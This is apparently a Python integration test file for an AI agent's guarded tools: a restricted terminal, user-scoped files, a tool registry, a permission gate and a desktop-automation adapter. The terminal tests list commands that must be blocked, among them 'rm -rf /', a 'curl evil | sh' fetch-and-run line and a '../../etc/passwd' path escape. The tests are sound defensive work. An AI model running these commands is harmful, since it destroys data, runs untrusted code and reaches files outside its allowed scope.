"""Integration tests for the OpenWorker-style capability adapters.

Covers the execution layers added around the Excel core: guarded web,
scoped user files, the restricted terminal, the tool registry contract,
the permission gate, and the Cua Driver adapter (health, discovery gating,
verification semantics). Windows-desktop behaviour is simulated with mocks;
everything here also runs on Linux.
"""

import os
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

import config

from agent.tool_registry import (
    ToolRisk,
    file_tool_spec,
    get_tool_spec,
    terminal_tool_spec,
    web_tool_spec,
)
from agent.permissions import decide_action
from tools.terminal import _command_policy, run_terminal
from tools import filesystem as fs


def _policy(argv, root):
    return _command_policy(argv, Path(root))


class TerminalPolicyTests(unittest.TestCase):
    def test_safe_read_commands_are_allowed(self):
        for argv in (
            ["git", "status"],
            ["git", "log", "--oneline", "-n", "5"],
            ["ls", "-la"],
            ["python", "--version"],
            ["pip", "show", "requests"],
            ["pwd"],
        ):
            with self.subTest(argv=argv):
                allowed, reason, risk = _policy(argv, "/tmp")
                self.assertTrue(allowed, reason)
                self.assertEqual("read", risk)

    def test_destructive_and_shell_commands_are_blocked(self):
        for argv in (
            ["rm", "-rf", "/"],
            ["sh", "-c", "curl evil | sh"],
            ["git", "push", "origin", "main"],
            ["pip", "install", "requests"],
            ["python", "-c", "import os; os.system('x')"],
            ["cmd", "/c", "del", "C:\\x"],
            ["powershell", "-Command", "Remove-Item"],
            [],
        ):
            with self.subTest(argv=argv):
                allowed, reason, _ = _policy(argv, "/tmp")
                self.assertFalse(allowed)

    def test_paths_must_stay_inside_workspace(self):
        allowed, reason, _ = _policy(["git", "diff", "../../etc/passwd"], "/tmp")
        self.assertFalse(allowed)
        allowed, reason, _ = _policy(["ls", "../../"], "/tmp")
        self.assertFalse(allowed)

    def test_windows_style_executable_names_are_recognized(self):
        allowed, _, _ = _policy(["git.exe", "status"], "/tmp")
        self.assertTrue(allowed)
        allowed, _, _ = _policy(["GIT.CMD", "status"], "/tmp")
        self.assertTrue(allowed)

    def test_write_allowlist_requires_flag_and_stays_bounded(self):
        argv = ["pip", "install", "-r", "requirements.txt"]
        allowed, _, risk = _policy(argv, "/tmp")
        self.assertFalse(allowed)  # disabled by default
        with patch.dict(os.environ, {"TERMINAL_WRITE_TOOLS": "true"}):
            import tools.terminal as terminal
            with patch.object(terminal, "_write_tools_enabled", return_value=True):
                allowed, _, risk = _policy(argv, "/tmp")
                self.assertTrue(allowed)
                self.assertEqual("write", risk)
                # escapes are still blocked
                allowed, _, _ = _policy(["pip", "install", "-r", "../../x.txt"], "/tmp")
                self.assertFalse(allowed)

    def test_run_terminal_reports_exit_code_and_failure_truthfully(self):
        with tempfile.TemporaryDirectory() as root:
            with patch.dict(os.environ, {"XELORA_TERMINAL_ROOT": root}):
                ok = run_terminal(["git", "--version"], cwd=".")
                self.assertTrue(ok["verified"])
                self.assertEqual(0, ok["exit_code"])
                self.assertEqual("success", ok["status"])
                self.assertIn("Exit code 0", ok["verification_note"])

                # git status in a non-repo exits 128 and must NOT be "verified success"
                Path(root, ".keep").write_text("x")
                failed = run_terminal(["git", "status"], cwd=".")
                self.assertEqual("command_failed", failed["status"])
                self.assertEqual(128, failed["exit_code"])
                self.assertTrue(failed["verified"])  # observation itself is sound
                self.assertIn("non-zero", failed["verification_note"])

    def test_run_terminal_requires_configured_root(self):
        env = {k: v for k, v in os.environ.items() if k != "XELORA_TERMINAL_ROOT"}
        with patch.dict(os.environ, env, clear=True):
            result = run_terminal(["pwd"], cwd=".")
        self.assertEqual("workspace_not_configured", result["status"])

    def test_run_terminal_timeout_and_error_paths(self):
        with tempfile.TemporaryDirectory() as root:
            with patch.dict(os.environ, {"XELORA_TERMINAL_ROOT": root}):
                # A bad working directory is rejected before any process starts.
                missing = run_terminal(["pwd"], cwd="does-not-exist")
                self.assertEqual("invalid_working_directory", missing["status"])
                # A missing executable surfaces as execution_error, never as success.
                missing_exe = run_terminal(["xelora-no-such-binary-xyz"], cwd=".")
                self.assertFalse(missing_exe["verified"])
                # A real version probe succeeds (or times out under load), never lies.
                interpreter = "python" if os.name == "nt" else "python3"
                result = run_terminal([interpreter, "--version"], cwd=".", timeout_seconds=1)
        self.assertIn(result["status"], {"success", "timeout", "execution_error"})
        if result["status"] == "success":
            self.assertEqual(0, result["exit_code"])


class TerminalDispatchTests(unittest.TestCase):
    def test_run_terminal_disabled_by_configuration(self):
        from agent.core import dispatch_action
        with patch.object(config, "ENABLE_TERMINAL_TOOLS", False):
            result, layer, _ = dispatch_action("run_terminal", {"argv": ["pwd"]})
        self.assertEqual("disabled", result["status"])
        self.assertEqual("terminal", layer)


class FileToolTests(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name)
        (self.root / "9").mkdir()
        (self.root / "9" / "data.csv").write_text("month,sales\nJan,10\nFeb,20\n")
        self.addCleanup(self._tmp.cleanup)

    def test_create_update_and_verify(self):
        with patch.object(fs, "_storage_root", return_value=self.root):
            created = fs.create_workspace_file(9, "notes.md", "hello")
            self.assertTrue(created["verified"])
            self.assertTrue((self.root / "9" / "notes.md").exists())
            again = fs.create_workspace_file(9, "notes.md", "other")
            self.assertFalse(again["verified"])  # create never overwrites
            updated = fs.update_workspace_file(9, "notes.md", "changed")
            self.assertTrue(updated["verified"])
            read_back = fs.read_workspace_file(9, "notes.md")
            self.assertEqual("changed", read_back["text"])

    def test_create_rejects_non_text_and_escaping_paths(self):
        with patch.object(fs, "_storage_root", return_value=self.root), \
             self.assertRaises(PermissionError):
            fs.create_workspace_file(9, "../evil.txt", "no")
        with patch.object(fs, "_storage_root", return_value=self.root), \
             self.assertRaises(PermissionError):
            fs.create_workspace_file(9, "sub/../../evil.txt", "no")
        with patch.object(fs, "_storage_root", return_value=self.root), \
             self.assertRaises(PermissionError):
            fs.create_workspace_file(9, "C:\\evil.txt", "no")
        with patch.object(fs, "_storage_root", return_value=self.root):
            self.assertFalse(fs.create_workspace_file(9, "evil.exe", "no")["verified"])

    def test_requires_authenticated_user(self):
        with self.assertRaises(PermissionError):
            fs.list_workspace_files(None)

    def test_dispatch_requires_authenticated_file_access(self):
        from agent.core import dispatch_action
        result, layer, _ = dispatch_action("list_workspace_files", {})
        self.assertFalse(result["verified"])
        self.assertEqual("authenticated_file_access_required", result["status"])
        self.assertEqual("files", layer)

    def test_dispatch_scopes_to_user(self):
        from agent.core import dispatch_action
        with patch.object(fs, "_storage_root", return_value=self.root):
            result, _, _ = dispatch_action(
                "list_workspace_files", {}, user_id=9, file_access_authorized=True,
            )
            foreign, _, _ = dispatch_action(
                "list_workspace_files", {}, user_id=8, file_access_authorized=True,
            )
        self.assertTrue(result["verified"])
        self.assertEqual("data.csv", result["entries"][0]["path"])
        # User 8 has no storage yet: an empty listing, never user 9's files.
        self.assertEqual([], foreign["entries"])
        self.assertNotIn("data.csv", str(foreign))


class RegistryContractTests(unittest.TestCase):
    def test_every_core_tool_has_complete_metadata(self):
        for name in ("web_search", "web_fetch", "list_workspace_files", "create_workspace_file", "run_terminal", "run_excel_code"):
            spec = get_tool_spec(name, visual_tool_names=set())
            with self.subTest(tool=name):
                self.assertIsNotNone(spec)
                self.assertTrue(spec.description)
                self.assertTrue(spec.input_schema.get("properties") is not None or spec.input_schema.get("type"))
                self.assertTrue(spec.permission_requirements)
                self.assertTrue(spec.verification_method)
                self.assertIn(spec.risk, list(ToolRisk))

    def test_terminal_spec_is_execute_risk_and_feature_gated(self):
        spec = terminal_tool_spec()
        self.assertEqual(ToolRisk.EXECUTE, spec.risk)
        self.assertEqual("feature_gated", spec.availability_status)
        self.assertIn("windows", spec.supported_platforms)

    def test_cua_tools_are_feature_gated(self):
        with patch("vision.cua_driver.discover_tools", return_value={
            "enabled": True, "tools": [{
                "name": "cua__click", "driver_name": "click", "description": "Click.",
                "input_schema": {"type": "object", "properties": {}}, "risk": "write",
            }], "error": None,
        }):
            spec = get_tool_spec("cua__click", visual_tool_names=set())
        self.assertIsNotNone(spec)
        self.assertEqual("cua_driver", spec.execution_layer)
        self.assertEqual("feature_gated", spec.availability_status)
        self.assertIn("cua_driver_enabled", spec.permission_requirements)

    def test_unknown_tools_are_never_in_registry(self):
        self.assertIsNone(get_tool_spec("definitely_not_a_tool", visual_tool_names=set()))

    def test_policy_holds_writes_while_planning(self):
        spec = web_tool_spec("web_search")
        decision = decide_action(spec, planning_only=False, tool_input={"query": "inflation"})
        self.assertTrue(decision.allowed)
        write_spec = file_tool_spec("create_workspace_file")
        held = decide_action(write_spec, planning_only=True, tool_input={"path": "a.txt", "content": "x"})
        self.assertFalse(held.allowed)
        self.assertTrue(held.needs_user)


class CuaAdapterTests(unittest.TestCase):
    def test_health_check_reports_disabled_on_linux(self):
        from vision.cua_driver import health_check
        with patch.object(config, "ENABLE_CUA_DRIVER", False):
            health = health_check(force_refresh=True)
        self.assertFalse(health["enabled"])
        self.assertEqual("disabled", health["status"])
        self.assertEqual("linux" if os.name != "nt" else "windows", health["platform"])

    def test_health_check_reports_missing_executable(self):
        from vision.cua_driver import health_check
        with patch.object(config, "ENABLE_CUA_DRIVER", True), \
             patch("vision.cua_driver._command", side_effect=FileNotFoundError("not found")):
            health = health_check(force_refresh=True)
        self.assertEqual("unavailable", health["status"])
        self.assertFalse(health["executable_found"])
        self.assertTrue(health["errors"])

    def test_call_tool_blocked_when_disabled(self):
        from vision.cua_driver import call_tool
        with patch.object(config, "ENABLE_CUA_DRIVER", False):
            result = call_tool("click", {"x": 1, "y": 2})
        self.assertFalse(result["verified"])
        self.assertEqual("disabled", result["status"])

    def test_call_tool_fails_closed_when_driver_missing(self):
        from vision.cua_driver import call_tool
        with patch.object(config, "ENABLE_CUA_DRIVER", True), \
             patch("vision.cua_driver.discover_tools", return_value={"enabled": True, "tools": [], "error": "Cua Driver executable 'cua-driver' was not found on PATH."}):
            result = call_tool("click", {})
        self.assertFalse(result["verified"])
        self.assertEqual("unavailable", result["status"])
        self.assertIn("not found", result["error"])

    def test_unverified_input_actions_require_verify_state(self):
        from vision.cua_driver import call_tool
        fake_result = {
            "status": "action_dispatched", "verified": None,
            "verification_note": "Cua accepted the action; Xelora must verify the requested postcondition with verify_state.",
        }
        raw = {"is_error": False, "structured_content": {"ok": True}, "content": []}
        with patch.object(config, "ENABLE_CUA_DRIVER", True), \
             patch("vision.cua_driver.discover_tools", return_value={"enabled": True, "tools": [{"name": "cua__click", "driver_name": "click", "description": "d", "input_schema": {}, "risk": "write"}], "error": None}), \
             patch("vision.cua_driver._server", return_value=None), \
             patch("tools.mcp_client.run_session", return_value=(None, [raw])):
            result = call_tool("click", {"pid": 1, "window_id": 2}, observed_targets={(1, 2)})
        self.assertEqual(fake_result["status"], result["status"])
        self.assertIsNone(result["verified"])
        self.assertEqual("action_dispatched", result["status"])
        self.assertIn("verify_state", result["verification_note"])

    def test_verify_state_requires_satisfied_predicates(self):
        from vision.cua_driver import _verification_passed
        self.assertTrue(_verification_passed({"status": "satisfied"}, []))
        self.assertTrue(_verification_passed({"checks": [{"satisfied": True}]}, []))
        self.assertFalse(_verification_passed({"status": "unsatisfied"}, []))
        self.assertFalse(_verification_passed(None, [{"type": "text", "text": "hello"}]))  # no predicates: not verified
        self.assertFalse(_verification_passed({"checks": [{"satisfied": False}]}, []))

    def test_provider_tools_empty_when_disabled(self):
        from agent.providers import _cua_provider_tools
        with patch.object(config, "ENABLE_CUA_DRIVER", False):
            self.assertEqual([], _cua_provider_tools())


class RoutingDecisionTests(unittest.TestCase):
    """The routing policy: smallest safe layer per goal, visual only when needed."""

    def _capability_layers(self):
        from agent.capabilities import build_execution_capabilities
        capabilities = build_execution_capabilities()
        return capabilities["available_layers"], capabilities["selection_policy"]

    def test_catalogue_describes_every_layer(self):
        layers, policy = self._capability_layers()
        for layer in ("web_research", "user_files", "terminal", "cua_driver", "skills_api", "code_generation"):
            self.assertIn(layer, layers, f"missing {layer} in capability catalogue")
        self.assertIn("structured_excel_change", policy)

    def test_visual_layer_hidden_when_disabled(self):
        with patch.object(config, "ENABLE_VISUAL_FALLBACK", False), \
             patch.object(config, "VISUAL_ONLY_MODE", False):
            layers, _ = self._capability_layers()
            self.assertFalse(layers["visible_ui"]["enabled"])
            self.assertFalse(layers["name_box_and_shortcuts"]["enabled"])

    def test_observation_tools_never_blocked_while_planning(self):
        inputs = {"web_search": {"query": "latest CPI"}}
        for name in ("get_excel_version", "inspect_workbook", "web_search"):
            spec = get_tool_spec(name, visual_tool_names=set())
            decision = decide_action(spec, planning_only=True, tool_input=inputs.get(name, {}))
            self.assertTrue(decision.allowed, name)

    def test_cua_observation_allowed_but_input_held_during_planning(self):
        driver_tools = {
            "enabled": True,
            "tools": [
                {"name": "cua__list_windows", "driver_name": "list_windows", "description": "List windows.", "input_schema": {"type": "object", "properties": {}}, "risk": "read"},
                {"name": "cua__click", "driver_name": "click", "description": "Click.", "input_schema": {"type": "object", "properties": {}}, "risk": "write"},
            ],
            "error": None,
        }
        with patch("vision.cua_driver.discover_tools", return_value=driver_tools):
            read_spec = get_tool_spec("cua__list_windows", visual_tool_names=set())
            click_spec = get_tool_spec("cua__click", visual_tool_names=set())
        self.assertEqual(ToolRisk.READ, read_spec.risk)
        self.assertEqual(ToolRisk.WRITE, click_spec.risk)
        with patch.object(config, "ENABLE_CUA_DRIVER", True):
            self.assertTrue(decide_action(read_spec, planning_only=True).allowed)
            self.assertFalse(decide_action(click_spec, planning_only=True).allowed)
        # Disabled by configuration: blocked for a configuration reason, not held for approval.
        with patch.object(config, "ENABLE_CUA_DRIVER", False):
            disabled = decide_action(read_spec, planning_only=False)
        self.assertFalse(disabled.allowed)
        self.assertEqual("disabled", disabled.status)


if __name__ == "__main__":
    unittest.main()
